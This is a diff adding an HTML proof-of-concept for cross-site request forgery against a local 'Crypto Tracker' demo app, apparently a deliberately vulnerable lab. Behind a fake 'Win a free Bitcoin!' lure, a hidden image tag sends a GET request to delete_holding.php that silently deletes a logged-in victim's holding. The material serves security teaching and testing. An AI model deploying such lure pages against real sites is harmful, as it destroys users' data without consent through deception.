@@ -1,0 +1,23 @@
+<!doctype html>
+<!--
+  csrf_delete.html — CSRF proof-of-concept (delete a victim's holding)
+
+  Demo: host this file anywhere OTHER than the app (e.g. open it as a local
+  file, or serve it on a different port). Have a victim who is logged in to the
+  Crypto Tracker in the same browser open this page. Because delete_holding.php
+  accepts a plain GET with no CSRF token and no SameSite cookie protection, the
+  victim's session cookie rides along and the holding is silently deleted.
+
+  Change id below to target a specific holding.
+-->
+<html>
+<head><meta charset="utf-8"><title>Win a free Bitcoin! 🎉</title></head>
+<body>
+  <h1>Congratulations — you won! 🎁</h1>
+  <p>Loading your prize...</p>
+
+  <!-- VULN target: CSRF via GET on delete_holding.php -->
+  <img src="http://localhost/crypto-tracker/delete_holding.php?id=1"
+       width="1" height="1" style="display:none" alt="">
+</body>
+</html>
